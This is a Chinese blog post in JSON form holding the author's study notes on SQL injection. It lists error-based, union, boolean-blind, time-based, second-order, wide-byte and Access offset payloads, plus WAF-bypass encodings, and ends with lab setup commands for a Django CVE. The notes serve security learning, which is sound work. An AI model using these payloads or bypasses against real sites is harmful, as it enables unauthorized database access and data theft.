{"title":"SQL注入2","uid":"96816457e24e5ee2d74dc29d18ce444d","slug":"SQL注入2","date":"2022-07-15T12:05:32.000Z","updated":"2022-07-15T14:18:08.765Z","comments":true,"path":"api/articles/SQL注入2.json","keywords":null,"cover":null,"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<p>补补基础，理解注入，记下学习笔记</p>\n<h1 id=\"SQL注入\"><a href=\"#SQL注入\" class=\"headerlink\" title=\"SQL注入\"></a>SQL注入</h1><h2 id=\"数字型\"><a href=\"#数字型\" class=\"headerlink\" title=\"数字型\"></a>数字型</h2><p>无需闭合单引号</p>\n<h2 id=\"字符型\"><a href=\"#字符型\" class=\"headerlink\" title=\"字符型\"></a>字符型</h2><p>闭合语句进行注入</p>\n<h2 id=\"注入测试流程\"><a href=\"#注入测试流程\" class=\"headerlink\" title=\"注入测试流程\"></a>注入测试流程</h2><h3 id=\"判断注入点注入类型\"><a href=\"#判断注入点注入类型\" class=\"headerlink\" title=\"判断注入点注入类型\"></a>判断注入点注入类型</h3><h3 id=\"获取信息函数\"><a href=\"#获取信息函数\" class=\"headerlink\" title=\"获取信息函数\"></a>获取信息函数</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">user() database() version()  @@hostname   @@datadir  @@version_compile_os\nschema() connection_id() system_user()\tsession_user()\tcurrent_user() current_user\nsuser_name() user_name() db_name() is_member(&#39;db_owner&#39;) #判断数据库角色 \nconvert(int,&#39;5&#39;) #类型转换 stuff Getdata </code></pre>\n\n<h3 id=\"有回显\"><a href=\"#有回显\" class=\"headerlink\" title=\"有回显\"></a>有回显</h3><ol>\n<li><p>报错注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1)\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e))\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\n?id&#x3D;1&#39; and exp(~(select * from (select user())a))   #必须按照这个模式来，mysql是大于709\n\n利用报错注入获取信息时，信息条数最好限定，limit 0,1</code></pre></li>\n<li><p>union注入：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">order by判断字段数\nuinon select 1,2,3...     #找回显点\nunion select 1,user(),3...   #利用回显点\n\nunion注入，需要前面的语句错误，前后字段相同，默认去掉重复，union all不去除重复</code></pre></li>\n</ol>\n<h3 id=\"无回显\"><a href=\"#无回显\" class=\"headerlink\" title=\"无回显\"></a>无回显</h3><ol>\n<li><p>布尔盲注</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">利用true和false判断\nand (left(database(),1)&#x3D;&#39;s&#39;)   #判断数据库名的第一个字符\n\nand (ascii(substr(database(),1,1))&#x3D;97)  #用ascii判断\n\nand (length(database())&#x3D;5)   #利用length判断\n\n一般来说使用&gt;  &lt; 来判断范围，之后再判断具体数据</code></pre></li>\n<li><p>延时注入</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">select benchark(1000,select * from user)   #mysql&lt;5.0,执行1000查询语句，尤其注意可能会导致数据库崩溃\n\nand sleep(5)   #直接测试能否执行\n\nand if(length(database())&gt;4,sleep(5),0)   #database&gt;4,则睡眠五秒\n\nand if(substring(user(),1,4)&#x3D;&#39;root&#39;,sleep(5),1)  #判断当前用户\n   \nand if(MID(version(),1,1)like 5,sleep(5),1)   #判断数据库版本\n\nand if(ascii(substring(database(),1,4))&gt;97,sleep(5),1)   #判断数据库名\n\n上面加了一些函数的用法，以达到获取信息</code></pre></li>\n</ol>\n<h3 id=\"二次注入\"><a href=\"#二次注入\" class=\"headerlink\" title=\"二次注入\"></a>二次注入</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">二次注入的使用是将语句带入数据库，在另外一个地方查询数据库信息时，执行该语句，返回执行结果\n比如：\n在注册用户时，将用户名设置为 aaa&#39; order by 7%23\n在另外查询用户数据的地方，存在带入查询，就会执行该语句\n之后不断修改用户名，再不断查询用户名返回结果，达到注入目的</code></pre>\n\n<h3 id=\"宽字节注入\"><a href=\"#宽字节注入\" class=\"headerlink\" title=\"宽字节注入\"></a>宽字节注入</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">在数据库使用GBK、GB18030、BIG5等编码时，可能存在宽字节注入\n在注入点使用了addslashes()等转义单引号，如：\n?id&#x3D;1&#39;   返回 id&#x3D;1\\&#39;\n\\在宽字节中编码为%5c,使用%df，则会将其转化为繁体字，从而绕过了单引号过滤\n?id&#x3D;1%df&#39;   这样进行注入</code></pre>\n\n<h3 id=\"其他特殊注入\"><a href=\"#其他特殊注入\" class=\"headerlink\" title=\"其他特殊注入\"></a>其他特殊注入</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">cookie注入\n\nxff头注入\n\nxml实体注入\n\n伪静态注入：\n在F12控制台输入：javascript:alert(document.lastModified)\n回车弹框时间，然后等几秒再来一次，查看时间是否和上次的相同，如果相同就证明是静态的，如果时间和上次不同，则是伪静态的网站   #https:&#x2F;&#x2F;blog.csdn.net&#x2F;p_utao&#x2F;article&#x2F;details&#x2F;108654640\n\n等等，大差不差\n\nAccess偏移注入：知道了表名，不知道字段的时候\n1.判断字段数 order by\n2.判断表名  使用union select * from 表名,如admin\n3.偏移注入  利用公式注入\n?id&#x3D;1+union+select+1,2,3,4,5,6,7,8,9+from+admin\n?id&#x3D;1+union+select+1,2,3,4,5,*+from+admin  \n#一个一个测试，到5用*号代替显示正常，利用公式\n9-5&#x3D;4;9-4*2&#x3D;1;则从1之后开始\n当前admin表中字段数就为4；\n?id&#x3D;1+union+select+1,a.id,b.id,*+from+(admin+as+a+inner+join+admin+as+b+on+a.id&#x3D;b.id)</code></pre>\n\n<h3 id=\"WAF绕过\"><a href=\"#WAF绕过\" class=\"headerlink\" title=\"WAF绕过\"></a>WAF绕过</h3><pre class=\"line-numbers language-none\"><code class=\"language-none\">常用的：\nor–+2&#x3D;!!!2 类假!!!2为真的结果，利用不变逻辑的!!!替代空格\n注释替代 and&#x2F;&#x2F;select&#x2F;&#x2F;uname&#x2F;&#x2F;from&#x2F;&#x2F;users\n+号连接字符替换\n大小写、双写、AND&#x2F;&amp;&amp;,OR&#x2F;||、&#x2F;*!xxx*&#x2F;、&#x2F;**&#x2F;、url编码、base64编码\n\n空格替换：\n%0a  新建一行\n%09  TAB键（水平）\n%0d  return功能\n%0b  TAB键（垂直）\n%0c  新建一页\n%20  就是空格\nhex编码\n\nemoji绕waf\n脏数据绕waf\n畸形协议绕过,该post为上传，burp一键切换\n替换常用的可能被waf屏蔽的函数</code></pre>\n\n<h2 id=\"CVE-2022-34265-Django-sql注入漏洞复现\"><a href=\"#CVE-2022-34265-Django-sql注入漏洞复现\" class=\"headerlink\" title=\"CVE-2022-34265   Django  sql注入漏洞复现\"></a>CVE-2022-34265   Django  sql注入漏洞复现</h2><p>使用vulhub环境</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">docker-compose up -d   #启动环境\n\ndocker ps    #查看服务端口\n\ndocker-compose down -v  #关闭环境，为啥，第二次使用不用下载直接启动</code></pre>\n\n<p>访问IP:8000</p>\n","text":" 补补基础，理解注入，记下学习笔记 SQL注入数字型无需闭合单引号 字符型闭合语句进行注入 注入测试流程判断注入点注入类型获取信息函数user() database() version() @@hostname @@datadir @@version_compile_os sch...","link":"","photos":[],"count_time":{"symbolsCount":"3.1k","symbolsTime":"3 mins."},"categories":[{"name":"安全漏洞基础","slug":"安全漏洞基础","count":7,"path":"api/categories/安全漏洞基础.json"}],"tags":[{"name":"owasp TOP 10","slug":"owasp-TOP-10","count":3,"path":"api/tags/owasp-TOP-10.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#SQL%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">SQL注入</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%95%B0%E5%AD%97%E5%9E%8B\"><span class=\"toc-text\">数字型</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%AD%97%E7%AC%A6%E5%9E%8B\"><span class=\"toc-text\">字符型</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%B3%A8%E5%85%A5%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B\"><span class=\"toc-text\">注入测试流程</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%88%A4%E6%96%AD%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B\"><span class=\"toc-text\">判断注入点注入类型</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%8E%B7%E5%8F%96%E4%BF%A1%E6%81%AF%E5%87%BD%E6%95%B0\"><span class=\"toc-text\">获取信息函数</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%89%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">有回显</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%97%A0%E5%9B%9E%E6%98%BE\"><span class=\"toc-text\">无回显</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">二次注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">宽字节注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%85%B6%E4%BB%96%E7%89%B9%E6%AE%8A%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">其他特殊注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#WAF%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">WAF绕过</span></a></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#CVE-2022-34265-Django-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">CVE-2022-34265   Django  sql注入漏洞复现</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"python免杀-小迪笔记","uid":"8d7177d71a9701596b230fd390060764","slug":"python免杀-小迪笔记","date":"2022-08-17T09:26:05.000Z","updated":"2022-09-05T11:26:44.457Z","comments":true,"path":"api/articles/python免杀-小迪笔记.json","keywords":null,"cover":null,"text":" python免杀 小迪安全加载shellcode方式首先是shellcode两种常见的利用python的加载方式 import ctypes shellcode &#x3D; b&#39;&#39; rwxpage &#x3D; ctypes.windll.kernel32.V...","link":"","photos":[],"count_time":{"symbolsCount":"22k","symbolsTime":"20 mins."},"categories":[{"name":"python","slug":"python","count":2,"path":"api/categories/python.json"}],"tags":[{"name":"免杀","slug":"免杀","count":2,"path":"api/tags/免杀.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Hack如何学习","uid":"a208cc555303d3d7e79b97f2e2214046","slug":"Hack如何学习","date":"2022-04-04T15:04:49.000Z","updated":"2022-04-04T16:02:35.056Z","comments":true,"path":"api/articles/Hack如何学习.json","keywords":null,"cover":null,"text":"InsiderPhD的HACK如何学习笔记关于各种人员学习hack​ 找漏洞不要想着只学ctf，这就是学习用的，很难转化为实战。比如说找个xss，你用ctf的payload很难在现实找到，因为大多数厂家都会防御这种攻击。 ​ 从ctf转化为实战从来不是一件简单的事情。 ​ 你应该...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[],"tags":[{"name":"hack学习","slug":"hack学习","count":1,"path":"api/tags/hack学习.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个躺平的安全layman","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}